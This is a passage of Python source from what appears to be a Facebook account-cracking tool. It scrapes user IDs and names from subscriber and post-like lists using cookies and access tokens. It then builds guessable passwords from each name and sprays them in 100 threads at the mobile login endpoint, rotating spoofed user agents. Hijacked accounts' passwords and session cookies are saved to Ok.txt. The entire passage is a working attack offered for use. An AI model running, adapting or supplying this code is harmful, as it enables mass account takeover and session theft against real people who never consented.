                response = r.get('https://graph.facebook.com/v1.0/{}/subscribers?access_token={}&pretty=1&fields=id%2Cname&limit=5000'.format(userid, token_eaag)).json()
                if 'summary' in str(response) and 'name' in str(response):
                    for z in response['data']:
                        try:
                            self.id, self.name = z['id'], z['name'].lower()
                            if str(self.id) in str(Dump):
                                continue
                            else:
                                Console().print(f"[bold blue]   ╰─>[bold green] Dump {self.id}/{len(Dump)} User         ", end='\r');time.sleep(0.0007)
                                Dump.append(f'{self.id}|{self.name}')
                        except (KeyError):
                            Console().print(f"[bold blue]   ╰─>[bold red] KeyError!                ", end='\r');time.sleep(3.6);continue
                    return 0
                else:
                    Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] Failed {userid} Users!          ", end='\r');time.sleep(3.6)
                    return 1
        except (KeyboardInterrupt):
            Console().print(f"[bold blue]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
            return 2
    ### DUMP LIKES ###
    def likes(self, postid, cookie, token_eaag, after):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'host': 'graph.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                    'cookie': cookie
                })
                response = r.get('https://graph.facebook.com/v1.0/{}/likes/?access_token={}&pretty=1&limit=25&after={}'.format(postid, token_eaag, after)).json()
                if 'id' in str(response) and 'name' in str(response):
                    for z in response['data']:
                        self.id, self.name = z['id'], z['name'].lower()
                        if str(self.id) in str(Dump):
                            continue
                        else:
                            Console().print(f"[bold blue]   ╰─>[bold green] Dump {self.id}/{len(Dump)} User         ", end='\r');time.sleep(0.0007)
                            Dump.append(f'{self.id}|{self.name}')
                    if '\'after\':' in str(response):
                        self.likes(postid, cookie, token_eaag, after = response['paging']['cursors']['after'])
                    else:
                        return 0
                else:
                    Console().print(f"[bold white]   ╰─>[bold yellow] Failed {postid} User!          ", end='\r');time.sleep(3.6)
                    return 1
        except (KeyboardInterrupt):
            Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
            return 2
### CRACK ###
class crack:

    def __init__(self) -> None:
        self.checkpoint, self.looping, self.success = [], 0, []
        pass
    ### GENERATE PASSWORD ###
    def generate_password(self, name):
        self.password = []
        for nama in name.split(' '):
            if len(name) <= 5:
                if len(nama) < 3:
                    continue
                else:
                    self.password.append(nama + '123')
                    self.password.append(nama + '1234')
                    self.password.append(nama + '12345')
                    self.password.append(nama + '123456')
            else:
                if len(nama) < 3:
                    self.password.append(name)
                else:
                    self.password.append(name)
                    self.password.append(nama + '123')
                    self.password.append(nama + '1234')
                    self.password.append(nama + '12345')
                    self.password.append(nama + '123456')
        self.password_ = []
        for z in self.password:
            if str(z) in str(self.password_):
                continue
            else:
                self.password_.append(z)
        return self.password_
    ### OPEN LIST DUMP ###
    def open_list(self):
        try:
            Console(width=70, style="bold white").print(Panel("""[italic white]Crack results[italic green] Ok[italic white] Saved In :[italic green] Results/Ok.txt
[italic white]Crack results[italic violet] Cp[bold white] Saved In :[italic violet] Results/Cp.txt""", title="[italic violet] Mode Result Akun"))
            with ThreadPoolExecutor(max_workers=100) as (V):
                for z in Dump:
                    self.email, self.nama = z.split('|')[0], z.split('|')[1]
                    self.password = self.generate_password(self.nama)
                    V.submit(self.main, Dump, self.email, self.password)
            Console().print("\r[bold white][[bold green]Done[bold white]]                           ");exit()
        except:exit()
    ### MAIN ###
    def main(self, total, email, password):
        try:
            for pws in password:
                self.useragent = self.realme_useragent(total = 1)                
                self.useragent = self.uhd_useragent(total = 2)
                with requests.Session() as r:
                    r.headers.update({
                        'connection': 'keep-alive',
                        'accept-language': 'id,en-US;q=0.9,en;q=0.8',
                        'sec-fetch-mode': 'navigate',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'sec-fetch-sest': 'document',
                        'sec-fetch-site': 'none',
                        'cache-control': 'max-age=0',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'host': 'm.alpha.facebook.com',
                        'user-agent': self.useragent
                    })
                    response = r.get('https://m.alpha.facebook.com/login.php?').text
                    try:
                        self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
                        self.m_ts = re.search('name="m_ts" value="(.*?)"', str(response)).group(1)
                        self.li = re.search('name="li" value="(.*?)"', str(response)).group(1)
                        self.fb_dtsg = re.search('{"dtsg":{"token":"(.*?)"', str(response)).group(1)
                        self.lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
                        self.__a = re.search('"encrypted":"(.*?)"', str(response)).group(1)
                        self.__spin_t = re.search('"__spin_t":(\d+),', str(response)).group(1)
                    except (AttributeError) as e:
                        Console().print("[bold hot_pink2]   ╰─>[bold red] Failed Scraping...                    ", end='\r');time.sleep(2.0);continue
                    data = {
                        'm_ts': self.m_ts,
                        'li': self.li,
                        'try_number': 0,
                        'unrecognized_tries': 0,
                        'email': email,
                        'prefill_contact_point': email,
                        'prefill_source': 'browser_dropdown',
                        'prefill_type': 'password',
                        'first_prefill_source': 'browser_dropdown',
                        'first_prefill_type': 'contact_point',
                        'had_cp_prefilled': True,
                        'had_password_prefilled': True,
                        'is_smart_lock': False,
                        'bi_xrwh': 0,
                        'encpass': '#PWD_BROWSER:0:{}:{}'.format(self.__spin_t, pws),
                        'fb_dtsg': self.fb_dtsg,
                        'jazoest': self.jazoest,
                        'lsd': self.lsd,
                        '__dyn': '',
                        '__csr': '',
                        '__req': random.choice(['1','2','3','4','5']),
                        '__a': self.__a,
                        '__user': 0
                    }
                    r.headers.update({
                        'cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
                        'sec-fetch-site': 'same-origin',
                        'origin': 'https://m.alpha.facebook.com',
                        'accept': '*/*',
                        'content-type': 'application/x-www-form-urlencoded',
                        'x-fb-lsd': self.lsd,
                        'referer': 'https://m.alpha.facebook.com/login.php?',
                        'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ])))
                    })
                    response2 = r.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data = data, allow_redirects = True)
                    #open('Response.txt', 'a+').write(f'{email}|{pws}|{r.cookies.get_dict()}\n')
                    if 'c_user' in r.cookies.get_dict().keys():
                        try:
                            self.cookie = (";".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
                        except:pass
                        tree = Tree("\r\t[italic green]─> Vulnerblity                        ", style = "bold white")
                        tree.add(f"\n[italic green]Database IDs : {email}").add(f"[italic green]Password : {pws}", style = "bold white")
                        tree.add(f"[italic green]Cookie Date : {self.cookie}", style = "bold white")
                        print(tree)
                        self.success.append(f'{email}|{pws}|{self.cookie}')
                        open('Results/Ok.txt', 'a+').write(f'{email}|{pws}|{self.cookie}\n')
                        break
                    elif 'checkpoint' in r.cookies.get_dict().keys():
                        tree = Tree("\r\n\t[italic white]Not Vulnerblity                       ", style = "bold white")
                        tree.add(f"[italic violet]Database IDs : {email}").add(f"[italic violet]Password : {pws}", style = "bold white")
                        tree.add(f"[italic violet]Useragent Date : {self.useragent}", style = "bold white")
                        print(tree)
                        self.checkpoint.append(f'{email}|{pws}|{self.useragent}')
                        open('Results/Cp.txt', 'a+').write(f'{email}|{pws}|{self.useragent}\n')
                        break
                    else:
                        continue
            self.looping += 1
            Console().print(f"[bold white]   ╰─>[bold white] Prosesing Date Hacking {str(len(Dump))}/{self.looping} Ok:-[bold green]{len(self.success)}[bold white] Cp:-[bold violet]{len(self.checkpoint)}[bold white]              ", end='\r')
        except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
            Console().print("[bold white]   ╰─>[bold red] Error Connection!                    ", end='\r');time.sleep(7.9);self.main(total, email, password)
    ### REALME USERAGENT ###
    def realme_useragent(self, total):
        for _ in range(total):
            self.browser_version = (f'{random.randrange(85, 105)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
            self.build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
            self.android_version = random.choice(['11', '10'])
            self.android_model = random.choice(['RMX2052', 'RMX2072', 'RMX2075', 'RMX2071', 'RMX2076', 'RMX2144'])
            self.useragent = ('Mozilla/5.0 (Linux; Android {}; {} Build/{}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.build, self.browser_version))
        return self.useragent
        
    def uhd_useragent(self, total):
        for _ in range(total):
            self.browser_version = (f'{random.randrange(85, 105)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
            self.build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
            self.android_version = random.choice(['11', '10'])
            self.android_model = random.choice(['RMX2052', 'RMX2072', 'RMX2075', 'RMX2071', 'RMX2076', 'RMX2144'])
            self.useragent = ('Mozilla/5.0 (Linux; Android 10; Infinix X680B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36'.format(self.android_version, self.android_model, self.build, self.browser_version))
        return self.useragent

if __name__ == '__main__':
    try:
        os.system('git pull');daftar_menu()
    except Exception as e:
        Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()